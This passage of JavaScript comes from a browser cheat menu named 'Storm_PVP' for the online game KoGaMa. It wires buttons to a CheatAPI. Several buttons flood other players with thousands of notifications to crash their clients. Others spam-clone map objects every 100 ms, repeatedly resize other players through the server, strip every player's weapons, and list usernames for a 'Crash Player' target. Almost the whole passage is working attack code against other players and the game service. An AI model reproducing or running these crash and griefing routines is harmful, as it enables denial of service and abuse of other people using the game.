    CheatAPI.CHEATS.KILL_NOTI(CheatAPI.KILLED_BY[window["Kill Notification"].options[window["Kill Notification"].selectedIndex].textContent])
})
interface.addSelect("Kill Notification Crash", Object.keys(CheatAPI.KILLED_BY), "Notif", function(){
    CheatAPI.CHEATS.KILL_NOTI2(CheatAPI.KILLED_BY[window["Kill Notification Crash"].options[window["Kill Notification Crash"].selectedIndex].textContent])
})
interface.addButton("Joined Notification", "Notif")
window["Joined Notification"].onclick = function(){
    CheatAPI.CHEATS.JOINED_NOTI("BOTH")
}
interface.addButton("Joined Notification CRASH", "Notif")
window["Joined Notification CRASH"].onclick = function(){{for(var lag = 0; lag < 9999; lag++){
    CheatAPI.CHEATS.JOINED_NOTI("CLIENT")
}}}
interface.addButton("Love Notification", "Notif")
window["Love Notification"].onclick = function(){
    CheatAPI.CHEATS.LOVE_NO("BOTH")
}
interface.addButton("Love Notification CRASH", "Notif")
window["Love Notification CRASH"].onclick = function(){{for(var lag = 0; lag < 9999; lag++){
    CheatAPI.CHEATS.LOVE_NO("CLIENT")
}}}
interface.addLine(true, 30, "Notif")
interface.addRange("Game tier (1)", "Notif")
window["Game tier (1)"].input.min = 0
window["Game tier (1)"].input.max = 255
window["Game tier (1)"].input.value = 1
window["Game tier (1)"].input.onchange = function(){
    window["Game tier (1)"].label.textContent = `Game tier(${window["Game tier (1)"].input.value})`
    CheatAPI.CHEATS.GAMETIER(parseInt(window["Game tier (1)"].input.value))
}



interface.addCheckBox("Anti-Kick", "Crash")
window["Anti-Kick"].onchange = function() {
    if (this.checked) {
        window.ssautofire2d4f = setInterval(() => {
   CheatAPI.PLAYERS.forEach((player)=>{ if(player.WOID != CheatAPI.PLAYER.WOID)
                CheatAPI.CHEATS.SET_SIZE(player.WOID,1,"SERVER")
        }, 1000)})
          } else {
        clearInterval(window.ssautofire2d4f)
        window.ssrapidfire2d4f = null
    }
}
interface.addCheckBox("Anti Crash", "Crash")
window["Anti Crash"].onchange = function() {
    if (this.checked) {
        CheatAPI.SERVER_BLOCKS.push(79)
        CheatAPI.SERVER_BLOCKS.push(57)
    } else {
        let index = [CheatAPI.SERVER_BLOCKS.indexOf(79), CheatAPI.SERVER_BLOCKS.indexOf(57)]
        CheatAPI.SERVER_BLOCKS.splice(index[0], index[0] - 1)
        CheatAPI.SERVER_BLOCKS.splice(index[1], index[1] - 1)
    }
}

interface.addSelect("Game", Object.keys(CheatAPI.Objects_XP), "MAP", function(){
    window["Water 999"].disabled = false
    window["Water -999"].disabled = false
})
interface.addCheckBox("Water 999", "MAP")
window["Water 999"].disabled = true
window["Water 999"].onchange = function(){
    if(this.checked){
        window.spamfstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects_XP[window["Game"].options[window["Game"].selectedIndex].value],999,99999999999999,999, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfstq)
    }
}
interface.addCheckBox("Water -999", "MAP")
window["Water -999"].disabled = true
window["Water -999"].onchange = function(){
    if(this.checked){
        window.sspamfstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects_XP[window["Game"].options[window["Game"].selectedIndex].value],-999,-9999999999999,-999, "BOTH")
        }, 100)
    }else{
        clearInterval(window.sspamfstq)
    }
}
interface.addLine(true, 30, "MAP")
 interface.addText(`War4`, "MAP")
interface.addCheckBox("No Weapons War4", "MAP")
window["No Weapons War4"].onchange = function() {
        CheatAPI.PLAYERS.forEach((player)=>{
  if(this.checked){
        window.wqspam3s = setInterval(()=>{
        CheatAPI.CHEATS.NO_WEAPONS_WAR4_TEAMG(player.WOID)
        CheatAPI.CHEATS.NO_WEAPONS_WAR4_TEAMB(player.WOID)
        CheatAPI.CHEATS.NO_WEAPONS_WAR4_TEAMR(player.WOID)
        CheatAPI.CHEATS.NO_WEAPONS_WAR4_TEAMY(player.WOID)
        }, 2500)
    }else{
        clearInterval(window.wqspam3s)

    }})
}

let waitingText = document.createElement("h1")
waitingText.className = "CheatWaitingText"
waitingText.textContent = "Storm_PVP Wainting Kogama..."
menu.appendChild(waitingText)

let check = setInterval(() => {
    if (window.kogamaload) {
        waitingText.remove()
        tabs.style.display = "block"
        interface.addLine(true, 30, "Other")
        interface.addText(`User Name: ${CheatAPI.PLAYER.USERNAME}`, "Other")
        interface.addText(`World Object ID: ${CheatAPI.PLAYER.WOID}`, "Other")
        interface.addText(`Actor Number: ${CheatAPI.PLAYER.ACTORNR}`, "Other")
        interface.addText("X: 0", "Other")
        interface.addText("Y: 0", "Other")
        interface.addText("Z: 0", "Other")
        Object.values(interface.tabs)[0].click()
        let players = []
        CheatAPI.PLAYERS.forEach((player)=>{
            players.push(player.USERNAME)
        })
        window["Crash Player"].updateOptions(players)
        clearInterval(check)

    }
}, 1000)
